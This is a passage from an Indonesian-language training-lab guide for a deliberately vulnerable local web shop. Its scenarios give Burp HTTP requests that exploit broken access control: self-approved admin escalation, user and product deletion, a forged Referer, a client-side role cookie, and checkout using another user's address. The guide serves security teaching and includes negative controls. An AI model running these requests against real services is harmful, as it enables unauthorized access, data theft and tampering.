`GET /api/users/me` yang hanya mengembalikan attacker.

**8. Dampak/debugging.** Attacker mendapatkan direktori pelanggan dan staf,
termasuk email/telepon, untuk phishing atau enumerasi target. Jika `403`,
pastikan token masih customer dan bukan hasil eskalasi A3.

---

### E2 — Hapus user tanpa cek role

**Demo:** 04 · **Hands-on:** destructive BFLA · **State:** menghapus dian

**1. Setup.** Registrasi baru; role customer. Korban adalah dian (`2001`).
Catat jumlah user sebelum: 7.

**2. UI.** Tombol hapus hanya muncul di panel admin. Customer tidak melihatnya.
Endpoint `DELETE /api/admin/users/:id` tetap ada di bundle.

**3. Burp.** Buat request dari Repeater, atau ambil dari panel admin jika Anda
sedang login sebagai admin (jangan pakai token admin untuk serangan). Ganti
token menjadi token attacker.

**4. Repeater.**

```http
DELETE /api/admin/users/2001 HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
```

**5. Expected.** `403`.

**6. Actual.** `204 No Content`; user dian terhapus.

**7. Validasi.** `GET /api/admin/users` (masih bisa diakses karena E1) sekarang
berisi 6 user, tanpa dian. `GET /api/users/2001/profile` mengembalikan `404`.
Login dian juga gagal karena user sudah tidak ada. Ini bukti state berubah.

**8. Dampak/debugging.** Attacker dapat menghapus akun pelanggan atau staf.
Restart server untuk mengembalikan dian. Jika `404`, dian sudah terhapus dari
percobaan sebelumnya; restart dan ulangi.

---

### E3 — Two-step privilege escalation lewat role-change request

**Demo:** 04 · **Hands-on:** alur persetujuan yang bisa disetujui sendiri
· **State:** role attacker menjadi admin

**1. Setup.** Registrasi baru. Jangan jalankan A3. Catat `<ID_ATTACKER>`.

**2. UI.** Tidak ada menu untuk request role. Endpoint ditemukan dari
`/openapi.json`/bundle. Ini alur dua langkah: buat request, lalu setujui.

**3. Burp.** Kirim request pertama, salin `request.id` dari respons. Lalu
kirim request kedua dengan ID itu.

**4. Repeater — langkah 1.**

```http
POST /api/admin/users/<ID_ATTACKER>/role-change HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Content-Type: application/json

{"role":"admin"}
```

Expected: `403`. Actual: `201`:

```json
{
  "request": {
    "id": 2,
    "userId": 1003,
    "requestedRole": "admin",
    "status": "pending",
    "requestedBy": 1003
  }
}
```

Langkah 2 — setujui request sendiri:

```http
PATCH /api/admin/role-change-requests/2/approve HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
```

**5. Expected.** Langkah 2 harus `403` karena approver bukan admin. Request
yang dibuat sendiri tidak boleh disetujui sendiri.

**6. Actual.** Langkah 2 `200`; body memuat request berstatus `approved` dan
user dengan `role: "admin"`.

**7. Validasi.** `GET /api/users/me` sekarang `role: "admin"`. Lanjutkan dengan
`GET /api/admin/audit-log`; hasilnya `200` (sebelum eskalasi `403`). Ini
membuktikan eskalasi penuh, bukan hanya field di respons.

**8. Dampak/debugging.** Customer dapat memberi dirinya role admin melalui alur
yang seharusnya membutuhkan approver. Ini berbeda dari mass assignment A3:
di sini ada objek request dan endpoint approval, tetapi keduanya tidak memeriksa
role. Restart server setelah skenario.

---

### E4 — Daftar role-change request bocor

**Demo:** 04 · **Hands-on:** BFLA · **State:** read-only

**1. Setup.** Registrasi baru; role customer. Seed memiliki request ID 1
(target alice, pending).

**2. UI.** Tidak ada menu. Endpoint dari OpenAPI/bundle.

**3. Burp.** Kirim dengan token attacker.

**4. Repeater.**

```http
GET /api/admin/role-change-requests HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Accept: application/json
```

**5. Expected.** `403`.

**6. Actual.** `200`; body memuat semua request, termasuk target user, role
yang diminta, status, dan `requestedBy`.

**7. Validasi.** Setelah E3, daftar bertambah dengan request attacker. Ini
menunjukkan data approval internal terbuka untuk customer.

**8. Dampak/debugging.** Attacker mengetahui siapa yang meminta role apa dan
dapat memetakan alur approval. Dampaknya informasi, bukan eksekusi; jangan
menaikkan klaim menjadi “attacker bisa approve” kecuali Anda juga menjalankan
E3.

---

### E5 — Ubah status user: endpoint tidak ada

**Demo:** 02 · **Hands-on:** recon negatif · **State:** tidak ada perubahan

**1. Setup.** Registrasi baru; token customer.

**2. UI.** Panel admin tidak memiliki kontrol status untuk customer. Tidak ada
form yang memicu request ini.

**3. Burp.** Coba:

```http
PATCH /api/admin/users/1002 HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Content-Type: application/json

{"status":"suspended"}
```

**4. Repeater.** Kirim; coba juga `PATCH /api/admin/users/1002/status`.

**5. Expected.** `404` karena route tidak ada.

**6. Actual.** `404` `{"error":"not_found"}`.

**7. Validasi.** `GET /api/admin/users` (E1) menunjukkan status bob tetap
`active`. Tidak ada perubahan state.

**8. Dampak/debugging.** Skenario “ubah status user” **tidak ada di build ini**.
Jangan mengarang request berhasil. Role change (E3) adalah alur berbeda dan
tidak mengubah `status`.

---

### E6 — Method-based bypass: tidak ada override

**Demo:** 02 · **Hands-on:** negative test · **State:** tidak ada perubahan

**1. Setup.** Registrasi baru; token customer. Korban bob (`1002`).

**2. UI.** Tidak ada UI untuk method override. Ini uji asumsi umum: apakah
server menghormati `X-HTTP-Method-Override`.

**3. Burp.** Kirim POST ke route admin dengan header override:

```http
POST /api/admin/users/1002 HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
X-HTTP-Method-Override: DELETE
Content-Type: application/json

{}
```

**4. Repeater.** Coba juga `PUT`, `PATCH`, dan `DELETE` langsung ke
`/api/admin/users/1002`.

**5. Expected.** `404`/`405`; tidak boleh ada bypass ke `DELETE`.

**6. Actual.** Semua `404` `{"error":"not_found"}`. Tidak ada middleware
override.

**7. Validasi.** `GET /api/admin/users` masih memuat bob; tidak ada
penghapusan.

**8. Dampak/debugging.** Tidak ada temuan. Ini contoh **false positive yang
harus ditolak**: route yang tidak ada bukan bypass. Jika suatu saat middleware
override ditambahkan, uji ulang dengan token customer dan pastikan `403`.

---

## 8. Administration

### F1 — Statistik admin tanpa cek role

**Demo:** 04 · **Hands-on:** BFLA read · **State:** read-only

**1. Setup.** Registrasi baru; role customer. Satu akun baru → total 7 user.

**2. UI.** Menu **Operasional** tidak terlihat untuk customer. Halaman
`/admin` tetap bisa dibuka langsung (F3), dan endpoint statistik dipanggil
oleh panel itu.

**3. Burp.** Kirim request dengan token attacker.

**4. Repeater.**

```http
GET /api/admin/stats HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Accept: application/json
```

**5. Expected.** `403`.

**6. Actual.** `200`:

```json
{"stats":{"users":7,"customers":4,"sellers":2,"products":8,"orders":8,"revenue":2970000,"openTickets":1}}
```

Angka dapat berubah setelah order/registrasi baru; `customers` 4 = alice, bob,
dian, attacker; `sellers` 2 = Alpha, Bravo.

**7. Validasi.** Cocokkan `users` dengan panjang array E1. `revenue` adalah
total order seed; setelah J1, nilai ini naik.

**8. Dampak/debugging.** Attacker melihat metrik bisnis internal. Dampaknya
informasi; jangan menyebutnya “mengubah data”. Jika `403`, token sudah admin
(mungkin karena A3/E3) atau bukan token attacker.

---

### F2 — Semua order + kontak pelanggan lewat endpoint admin

**Demo:** 04 · **Hands-on:** BFLA data · **State:** read-only

**1. Setup.** Registrasi baru; role customer. Seed memiliki 8 order.

**2. UI.** Tidak ada menu. Endpoint dari panel admin atau `/openapi.json`.

**3. Burp.** Kirim dengan token attacker; jangan memakai cookie admin.

**4. Repeater.**

```http
GET /api/admin/orders HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Accept: application/json
```

**5. Expected.** `403`.

**6. Actual.** `200`; array semua order, masing-masing dengan `customer.email`
dan `customer.phone`. Order 5002 menampilkan bob; 5001 alice; 5003 dian.

**7. Validasi.** Cari `id: 5002` dan pastikan `userId: 1002`; token attacker
tidak memiliki order itu. Bandingkan dengan `GET /api/orders` yang hanya
order sendiri.

**8. Dampak/debugging.** Seluruh transaksi dan kontak pelanggan bocor. Ini
BFLA, bukan IDOR per-user. Jika `403`, cek token; jika body kosong, mungkin
server baru di-restart dan seed tidak termuat.

---

### F3 — Panel admin hanya disembunyikan di client

**Demo:** 02 + 04 · **Hands-on:** UI-only authorization · **State:** read-only

**1. Setup.** Registrasi baru; role customer. Jangan eskalasi role.

**2. UI.** Login sebagai attacker. Menu **Operasional** tidak terlihat. Lalu
navigasi langsung ke `http://127.0.0.1:3000/admin`.

**3. Burp.** Di HTTP history, perhatikan dua request:

```http
GET /admin HTTP/1.1
Host: 127.0.0.1:3000
```

Respons `200` berisi shell SPA. Setelah halaman render, browser memanggil:

```http
GET /api/admin/users HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
```

**4. Repeater.** Kirim request API di atas. Tidak perlu cookie admin.

**5. Expected.** Halaman `/admin` harus menolak/redirect, dan API harus `403`.

**6. Actual.** `GET /admin` `200` (fallback SPA), lalu
`GET /api/admin/users` `200`. Halaman menampilkan tabel **Akun pengguna**
dengan 7 akun, termasuk admin, bob, dan dian.

**7. Validasi.** Di browser, buka DevTools → Network; request API yang sama
terlihat. Ini membuktikan UI menyembunyikan menu, bukan server menolak akses.
Jika Anda hanya melihat halaman kosong, tunggu request API selesai atau cek
console.

**8. Dampak/debugging.** Customer memperoleh panel admin penuh secara visual
dan dapat memanggil semua endpoint yang dipakai panel. Menyembunyikan tombol
bukan kontrol otorisasi. Jika API `403` tetapi `/admin` `200`, itu hanya
shell; jangan menyebut panel “bocor” tanpa data API.

---

### F4 — Export laporan admin dengan Referer palsu

**Demo:** 04 · **Hands-on:** trust pada header · **State:** read-only

**1. Setup.** Registrasi baru; role customer.

**2. UI.** Tidak ada tombol export di panel customer. Endpoint
`/api/admin/reports/export` ditemukan dari sourcemap/OpenAPI. Panel admin
mungkin memanggilnya, tetapi customer tidak melihat tombolnya.

**3. Burp.** Kirim request dengan token customer. Pertama tanpa `Referer`,
lalu dengan `Referer` halaman admin.

**4. Repeater — tanpa Referer.**

```http
GET /api/admin/reports/export HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Accept: text/csv
```

Expected dan actual: `403` `{"error":"forbidden"}`.

**5. Repeater — dengan Referer.**

```http
GET /api/admin/reports/export HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Referer: http://127.0.0.1:3000/admin
Accept: text/csv
```

**6. Expected.** `403`; header `Referer` tidak boleh menjadi bukti role.

**7. Actual.** `200`, `Content-Type: text/csv`, body berisi laporan order
(header CSV dan baris order), termasuk data pelanggan seperti bob dan alice.
Ini membuktikan pengecekan hanya melihat Referer.

**8. Dampak/debugging.** Attacker mengunduh laporan operasional lengkap.
`Referer` mudah dipalsukan dan tidak tersedia pada beberapa request; jangan
pernah memakainya sebagai kontrol akses. Jika `403` meski ada Referer, cek
apakah Burp membuang header atau path-nya berbeda.

---

### F5 — Audit log: kontrol negatif yang benar

**Demo:** 02 + 04 · **Hands-on:** negative control · **State:** read-only

**1. Setup.** Registrasi baru; role customer. Sebelum eskalasi apa pun.

**2. UI.** Buka `/admin` langsung (F3). Panel menampilkan tombol **Audit log**;
klik. Request yang dipicu:

```http
GET /api/admin/audit-log HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
```

**3. Burp.** Kirim request di atas dari Repeater.

**4. Expected dan actual.** `403` `{"error":"forbidden"}`. Endpoint ini
**selalu** menolak non-admin, bahkan di build VULN-only, karena merupakan
kontrol negatif.

**5. Validasi.** Setelah E3 (role attacker menjadi admin), request yang sama
menjadi `200`. Itu bukan bug pada kontrol negatif; itu konsekuensi eskalasi
yang sudah terbukti. Untuk demonstrasi kontrol negatif, gunakan token customer
sebelum eskalasi.

**6. Pembanding.** `/api/admin/users` `200` untuk customer (E1), sedangkan
`/api/admin/audit-log` `403`. Ini mengajarkan bahwa endpoint tersembunyi belum
tentu rentan; uji satu per satu.

**7. Dampak/debugging.** Tidak ada data audit yang bocor untuk non-admin.
Jangan memakai endpoint ini sebagai bukti “semua endpoint admin rentan”. Jika
`403` padahal Anda admin, cek role di `GET /api/users/me` dan restart bila
perlu.

**8. Catatan fasilitator.** Kontrol negatif ini penting untuk melatih
triase: menemukan endpoint bukan sama dengan menemukan kerentanan.

---
## 9. Documents

### G1 — IDOR metadata dokumen

**Demo:** 03 · **Hands-on:** IDOR dokumen · **State:** read-only

**1. Setup.** Registrasi baru. Folder dokumen seed: 1 = Alpha Works (8001),
2 = Bravo Office (8002), 3 = alice (1001). Akun baru **tidak punya folder**.

**2. UI.** Buka **Dokumen**. Akun baru melihat daftar kosong dan tidak punya
tombol upload yang aktif. Endpoint tetap ada di bundle:
`GET /api/documents/:id`.

**3. Burp.** Ambil `GET /api/documents` dari HTTP history; kirim ke Repeater;
ubah path ke `/api/documents/1`.

**4. Repeater.**

```http
GET /api/documents/1 HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Accept: application/json
```

**5. Expected.** `403`; dokumen 1 milik partner 8001, bukan attacker.

**6. Actual.** `200`:

```json
{
  "document": {
    "id": 1,
    "folderId": 1,
    "ownerId": 8001,
    "filename": "kontrak-kerjasama-2026.txt",
    "mime": "text/plain",
    "size": 322,
    "createdAt": "2026-08-21T04:20:00Z"
  }
}
```

**7. Validasi.** `GET /api/documents/2` juga `200` (milik 8002);
`GET /api/documents/3` `200` (milik alice). Attacker tidak memiliki folder
maupun dokumen ini.

**8. Dampak/debugging.** Attacker memetakan kontrak, penawaran, dan catatan
internal partner. Metadata saja sudah membocorkan nama file dan ukuran; isi
file dibuktikan di G2. Jika `404`, dokumen tidak ada; jika `403`, build berbeda.

---

### G2 — IDOR download isi dokumen

**Demo:** 03 · **Hands-on:** IDOR file · **State:** read-only

**1. Setup.** Sama seperti G1. Dokumen 2 berisi penawaran Bravo.

**2. UI.** Tidak ada tautan download untuk dokumen partner. Pola URL terlihat
di bundle: `/api/documents/:id/download`.

**3. Burp.** Buat request dari Repeater. Respons berupa teks, bukan JSON.

**4. Repeater.**

```http
GET /api/documents/2/download HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
```

**5. Expected.** `403`.

**6. Actual.** `200` dengan `Content-Type: text/plain; charset=utf-8` dan
`Content-Disposition: attachment; filename="penawaran-harga-q4-2026.txt"`.
Isi body memuat:

```text
PENAWARAN HARGA Q4 2026

Penyedia: Bravo Office
Nomor: BO-Q4-2026-07
Katalog: perlengkapan kantor dan ergonomi

Data fiktif.
```

**7. Validasi.** Ulangi untuk dokumen 1; isinya kontrak Alpha Works. Bandingkan
dengan `GET /api/documents` milik attacker yang kosong. Attacker tidak mungkin
mendapatkan file ini lewat UI.

**8. Dampak/debugging.** Isi kontrak/penawaran partner bocor. Jangan berhenti
di status `200`; tunjukkan isi file sebagai bukti. Jika body kosong, cek
`Content-Disposition` dan simpan respons mentah.

---

### G3 — Enumerasi ID dokumen dengan Intruder

**Demo:** 03 · **Hands-on:** enumerasi · **State:** read-only

**1. Setup.** Registrasi baru. Sebelum upload G4, dokumen yang ada hanya 1–3.

**2. UI.** Tidak ada daftar partner. Ini murni enumerasi endpoint.

**3. Burp.** Kirim `GET /api/documents/1` ke **Intruder**. Pilih posisi `§1§`
pada path. Payload type **Numbers**, from 1 to 10, step 1, no padding. Start
attack.

**4. Repeater/Intruder request.**

```http
GET /api/documents/§1§ HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Accept: application/json
```

**5. Expected.** `403` untuk 1–3 (milik pihak lain); `404` untuk ID yang tidak
ada.

**6. Actual.** `200` untuk 1, 2, dan 3; `404` untuk 4–10 (sebelum G4).
Response 200 memuat metadata dokumen partner.

**7. Validasi.** Setelah G4, ulangi attack: ID 4 menjadi `200` karena dokumen
baru milik attacker. Ini membuktikan enumerasi mengikuti data yang ada.

**8. Dampak/debugging.** Attacker dapat menemukan seluruh dokumen dengan ID
berurutan tanpa UI. Burp Community membatasi kecepatan Intruder; 10 request
cukup untuk demonstrasi. Jangan memakai serangan ini ke sistem nyata tanpa izin.

---

### G4 — Upload ke folder partner (BOLA write)

**Demo:** 03 · **Hands-on:** IDOR tulis + upload · **State:** menambah dokumen

**1. Setup.** Registrasi baru. Akun baru tidak punya folder, jadi UI upload
menampilkan pilihan kosong. Ini disengaja; request dibuat manual.

**2. UI.** Buka **Dokumen**. Perhatikan tidak ada folder dan tombol upload
tidak bisa dipakai. Endpoint `POST /api/documents` tetap ada di bundle; recon
menemukannya.

**3. Burp.** Buat request multipart di Repeater. `folderId=1` adalah folder
Alpha Works (8001), bukan milik attacker. File harus berekstensi `.txt`,
`.md`, `.csv`, atau `.log`, maksimal 256 KB.

**4. Repeater.**

```http
POST /api/documents HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Content-Type: multipart/form-data; boundary=----BACLAB

------BACLAB
Content-Disposition: form-data; name="folderId"

1
------BACLAB
Content-Disposition: form-data; name="file"; filename="audit.txt"
Content-Type: text/plain

Catatan audit.
------BACLAB--
```

**5. Expected.** `403`; folder 1 bukan milik attacker.

**6. Actual.** `201`; body memuat dokumen baru dengan `folderId: 1`,
`ownerId: <ID_ATTACKER>`, `filename: "audit.txt"`. ID dokumen adalah 4 pada
state seed.

**7. Validasi.** `GET /api/documents/4` dengan token attacker mengembalikan
`200`; `GET /api/documents/1/download` tidak berubah. Dokumen baru berada di
folder partner, tetapi owner-nya attacker. Ini membuktikan relasi folder tidak
divalidasi.

**8. Dampak/debugging.** Attacker menanam file di ruang dokumen partner.
Dampaknya integritas/abuse, bukan eksekusi kode: ekstensi dibatasi dan file
disajikan sebagai teks. Jika `400`, cek boundary dan `Content-Length`; jika
`404`, folder ID salah. Restart server setelah skenario.

---

## 10. Public Company Blog

### H1 — Direktori karyawan/partner tanpa autentikasi

**Demo:** 02 + 03 · **Hands-on:** missing authentication · **State:** read-only

**1. Setup.** Tidak perlu token. Ini endpoint publik yang seharusnya internal.

**2. UI.** Tidak ada menu. Endpoint ditemukan dari sourcemap atau
`/openapi.json`. Bisa dibuka langsung di browser.

**3. Burp.** Kirim tanpa `Authorization`. Pastikan tidak ada cookie sesi yang
otomatis ditambahkan.

**4. Repeater.**

```http
GET /api/employees HTTP/1.1
Host: 127.0.0.1:3000
Accept: application/json
```

**5. Expected.** `401`.

**6. Actual.** `200`; `count: 3`, array berisi Andi Wijaya, Maya Sari, dan Rani
Kusnadi, lengkap dengan `email`, `phone`, `guid`, `title`, dan `department`.

**7. Validasi.** Ambil GUID Andi
`3f2b8c1e-5a4d-4f7a-9b2e-7c1d0a6f8e21`, lalu buka H3. Tidak ada token di
kedua request.

**8. Dampak/debugging.** Direktori partner dan staf operasional bocor. GUID
memang sulit ditebak, tetapi endpoint daftar membocorkan semuanya. Jika `401`,
berarti build berbeda atau ada middleware auth global yang tidak ada di sini.

---

### H2 — Artikel publik membocorkan profil internal + GUID

**Demo:** 02 + 03 · **Hands-on:** excessive data exposure · **State:** read-only

**1. Setup.** Tidak perlu token. Artikel `merapikan-meja-kerja` adalah artikel
publik.

**2. UI.** Buka **Blog**/artikel dari katalog publik. UI hanya menampilkan nama
dan jabatan penulis; field internal tidak ditampilkan.

**3. Burp.** Ambil `GET /api/articles/merapikan-meja-kerja` dari HTTP history.
Lihat response JSON, bukan hanya halaman.

**4. Repeater.**

```http
GET /api/articles/merapikan-meja-kerja HTTP/1.1
Host: 127.0.0.1:3000
Accept: application/json
```

**5. Expected.** Hanya field publik: `author.name`, `author.title`,
`author.department`. `email`, `phone`, `location`, dan `guid` tidak boleh
muncul.

**6. Actual.** `200`; `author` memuat `guid`, dan `authorProfile` memuat objek
employee lengkap: `guid`, `email`, `phone`, `location`, `userId`, dan `bio`.
Untuk artikel ini, GUID-nya
`3f2b8c1e-5a4d-4f7a-9b2e-7c1d0a6f8e21`.

**7. Validasi.** Gunakan GUID tersebut di H3. `GET /api/employees/<GUID>`
mengembalikan profil yang sama tanpa token. Ini membuktikan GUID dari artikel
adalah kunci akses, bukan sekadar metadata.

**8. Dampak/debugging.** Artikel publik menjadi alat enumerasi profil internal.
Jangan menyebut ini “IDOR” jika tidak ada objek milik token; ini *excessive
data exposure* yang berantai dengan endpoint tanpa auth. Jika `authorProfile`
tidak ada, Anda mungkin melihat daftar artikel, bukan detail.

---

### H3 — Profil karyawan via GUID tanpa autentikasi

**Demo:** 03 · **Hands-on:** chain dari H2 · **State:** read-only

**1. Setup.** Tidak perlu token. Gunakan GUID dari H2 (Andi) atau dari H1.

**2. UI.** Tidak ada tautan publik ke profil karyawan. Ini hasil recon H1/H2.

**3. Burp.** Kirim request tanpa header `Authorization`.

**4. Repeater.**

```http
GET /api/employees/3f2b8c1e-5a4d-4f7a-9b2e-7c1d0a6f8e21 HTTP/1.1
Host: 127.0.0.1:3000
Accept: application/json
```

**5. Expected.** `401`.

**6. Actual.** `200`:

```json
{
  "employee": {
    "guid": "3f2b8c1e-5a4d-4f7a-9b2e-7c1d0a6f8e21",
    "userId": 8001,
    "name": "Andi Wijaya",
    "title": "Pemilik Alpha Works",
    "department": "Partner Marketplace",
    "location": "Bandung",
    "email": "andi@alphaworks.example",
    "phone": "+62 811-8001-11"
  }
}
```

**7. Validasi.** Coba GUID acak; hasilnya `404`, jadi endpoint tidak
mem-bypass apa pun—ia memang tidak meminta auth. Bandingkan dengan
`GET /api/users/8001/profile` tanpa token, yang seharusnya `401`.

**8. Dampak/debugging.** Profil partner/staf dengan kontak langsung bocor.
Skenario ini adalah rantai H2 → H3: GUID dari artikel publik dipakai untuk
mengambil profil internal. Jika `404`, GUID salah; salin dari respons H2,
jangan mengetik ulang.

---

## 11. Seller Panel

### I1 — Cookie `role=seller`: buka panel dan buat produk

**Demo:** 04 · **Hands-on:** client-controlled role + BFLA · **State:** menambah produk

**1. Setup.** Registrasi baru; role customer. Login/registrasi memberi cookie
`role=customer`.

**2. UI.** Menu **Penjual** tidak terlihat. Endpoint `/api/seller/summary` dan
`POST /api/products` ditemukan dari bundle/OpenAPI. UI tidak menyediakan akses
untuk customer.

**3. Burp.** Ambil request API dengan token attacker, tambahkan
`Cookie: role=seller`. Jangan mengubah token.

**4. Repeater — kontrol.**

```http
GET /api/seller/summary HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Cookie: role=customer
```

Expected/actual: `403` `{"error":"forbidden"}`.

**5. Repeater — serangan.**

```http
GET /api/seller/summary HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Cookie: role=seller
Accept: application/json
```

**6. Expected.** `403`; role harus dari akun, bukan cookie.

**7. Actual.** `200`; body memuat **semua** produk (termasuk milik 8001/8002),
semua order, dan `revenue` toko. Lalu buat produk:

```http
POST /api/products HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Cookie: role=seller
Content-Type: application/json

{"name":"Produk Audit","sku":"AUDIT-001","price":123000,"stock":5,"tone":"slate"}
```

Respons `201`; `product.sellerId` adalah `<ID_ATTACKER>`, bukan 8001/8002.
Artinya customer berhasil membuat produk atas namanya sendiri di katalog.

**8. Dampak/debugging.** Customer dapat membuka panel penjual dan memasukkan
produk ke katalog. Dampaknya integritas katalog dan potensi penipuan; bukan
RCE. Restart server setelah skenario.

---

### I2 — IDOR update produk seller lain

**Demo:** 03 + 04 · **Hands-on:** BOLA write · **State:** mengubah produk 8002

**1. Setup.** Registrasi baru; cookie `role=seller` pada request. Produk 104
(`MA-DUAL`, Monitor arm dual) milik seller 8002.

**2. UI.** Panel penjual hanya menampilkan tombol edit untuk produk sendiri.
Attacker tidak punya produk; endpoint `PATCH /api/products/:id` tetap ada.

**3. Burp.** Kirim request dengan token attacker + cookie seller. Ganti path ke
`104`.

**4. Repeater.**

```http
PATCH /api/products/104 HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Cookie: role=seller
Content-Type: application/json

{"price":123000}
```

**5. Expected.** `403`; produk 104 bukan milik attacker.

**6. Actual.** `200`; body `product` menunjukkan `price: 123000`, tetapi
`sellerId` tetap `8002`. Attacker mengubah produk partner lain.

**7. Validasi.** `GET /api/products/104` (publik) menampilkan harga baru.
`GET /api/seller/summary` juga menampilkannya. Ini membuktikan perubahan
persisten pada katalog.

**8. Dampak/debugging.** Attacker dapat menurunkan/menaikkan harga produk
partner, merusak katalog, atau memicu kerugian. Cookie seller diperlukan untuk
melewati guard role; kepemilikan produk tetap tidak dicek. Restart server.

---

### I3 — IDOR delete produk seller lain

**Demo:** 03 + 04 · **Hands-on:** BOLA delete · **State:** menghapus produk 8002

**1. Setup.** Registrasi baru; cookie `role=seller`. Produk 106 (`SLV-14`,
Laptop sleeve 14 inci) milik 8002.

**2. UI.** Tombol hapus hanya untuk produk sendiri. Endpoint
`DELETE /api/products/:id` ada di bundle.

**3. Burp.** Kirim dengan token attacker + cookie seller.

**4. Repeater.**

```http
DELETE /api/products/106 HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Cookie: role=seller
```

**5. Expected.** `403`.

**6. Actual.** `204 No Content`.

**7. Validasi.** `GET /api/products/106` sekarang `404` (produk tidak aktif/
tidak ditemukan). `GET /api/seller/summary` tidak lagi memuat 106. Ini bukti
penghapusan nyata.

**8. Dampak/debugging.** Attacker menghapus produk partner dari katalog.
Restart server untuk mengembalikan produk. Jika `400`, produk masih direferensikan
order; gunakan produk lain yang tidak dipakai order seed.

---

## 12. Cart and Checkout

### J1 — Checkout memakai alamat orang lain

**Demo:** 03 · **Hands-on:** BOLA pada relasi · **State:** membuat order baru

**1. Setup.** Registrasi baru; token customer. Address 3002 milik bob. Produk
101 stok cukup.

**2. UI.** Buka katalog, tambahkan produk ke cart, lalu checkout. UI hanya
menampilkan alamat milik attacker. Untuk memilih alamat bob, request checkout
diubah di Burp.

**3. Burp.** Selesaikan checkout normal dengan alamat sendiri untuk melihat
request. Lalu kirim ulang dengan `addressId: 3002`. Atau buat manual setelah
cart berisi item.

**4. Repeater — isi cart.**

```http
POST /api/cart/items HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Content-Type: application/json

{"productId":101,"qty":1}
```

Expected: `201` untuk cart sendiri. Actual: `201`; cart berisi produk 101.

**5. Repeater — checkout.**

```http
POST /api/cart/checkout HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer <TOKEN_ATTACKER>
Content-Type: application/json

{"addressId":3002}
```

**6. Expected.** `400`/`403`; alamat 3002 bukan milik attacker, jadi checkout
harus ditolak.

**7. Actual.** `201`; body memuat `order` dengan `userId` attacker,
`addressId: 3002`, `address` milik bob, dan `invoice` baru. Order dikirim ke
nama/alamat/telepon bob.

**8. Dampak/debugging.** Attacker dapat membuat pesanan yang dikirim ke alamat
korban, atau memakai data kontak korban untuk penipuan. Ini BOLA pada relasi,
bukan IDOR order biasa. Restart server setelah skenario untuk mengembalikan
stok, cart, dan order seed.

---

## 13. Endpoint yang sengaja tidak rentan / tidak masuk daftar

Dokumentasikan ini agar peserta tidak salah menyebut false positive.

| Endpoint | Perilaku | Kesimpulan |
|---|---|---|
| `POST /api/auth/login` | Verifikasi hash password, token valid | Auth benar; bukan target BAC |
| `GET /api/users/me` | Hanya user dari token | Bukan IDOR |
| `GET /api/orders` | Hanya order milik token | Bukan IDOR |
| `GET /api/tickets` | Hanya tiket milik token | Bukan IDOR |
| `GET /api/invoices` | Hanya invoice milik token | Bukan IDOR |
| `GET /api/documents` | Hanya dokumen/folder milik token | Bukan IDOR |
| `GET /api/products` | Katalog publik | Bukan kebocoran |
| `GET /api/articles` | Daftar artikel publik tanpa profil internal | Bukan kebocoran |
| `GET /api/admin/audit-log` | Selalu 403 untuk non-admin | Kontrol negatif |
| `GET /api/health` | Status server tanpa data sensitif | Bukan kebocoran |
| `POST /api/tickets/:id/messages` | Tidak ada route | Bukan temuan |
| `PATCH /api/admin/users/:id` | Tidak ada route | Bukan temuan |
| `POST /api/admin/users/:id` + override | Tidak ada route/override | Bukan temuan |

Endpoint tersembunyi yang ditemukan tetapi tidak rentan juga merupakan hasil
recon yang berguna. Jangan memaksakan IDOR pada endpoint yang memfilter
berdasarkan token.

---

## 14. Troubleshooting saat seminar

| Gejala | Penyebab umum | Tindakan |
|---|---|---|
| `401` di semua request | Token hilang, kedaluwarsa, atau server restart | Salin token baru; cek `Authorization: Bearer` |
| `403` pada endpoint yang seharusnya VULN | Token bukan attacker, cookie/role sudah berubah, atau endpoint kontrol negatif | Cek `GET /api/users/me`; restart |
| `404` pada ID seed | State sudah dihapus/diubah, atau server restart | Restart; gunakan ID dari respons |
| `409` saat registrasi | Username sudah dipakai | Restart atau ganti username |
| Request localhost tidak muncul di Burp | Browser tidak mem-proxy localhost | Pakai browser Burp, atau Firefox `network.proxy.allow_hijacking_localhost=true` |
| Upload `400` | Boundary/`Content-Length` salah, ekstensi tidak diizinkan, file >256 KB | Gunakan `.txt`; biarkan Burp menghitung length |
| PDF tidak terbaca | Body biner disimpan sebagai teks | Simpan raw response; gunakan `strings`/Render |
| Cookie role tidak berpengaruh | `Cookie` header tidak terkirim/tertimpa | Kirim satu header `Cookie`; cek di Burp |
| Panel admin kosong | Request API belum selesai/gagal | Buka DevTools Network; cek `/api/admin/users` |
| Intruder lambat | Burp Community throttling | Uji 5–10 payload saja |

### Reset cepat

```bash
# hentikan server
Ctrl-C
# mulai ulang; seluruh seed kembali
npm start
```

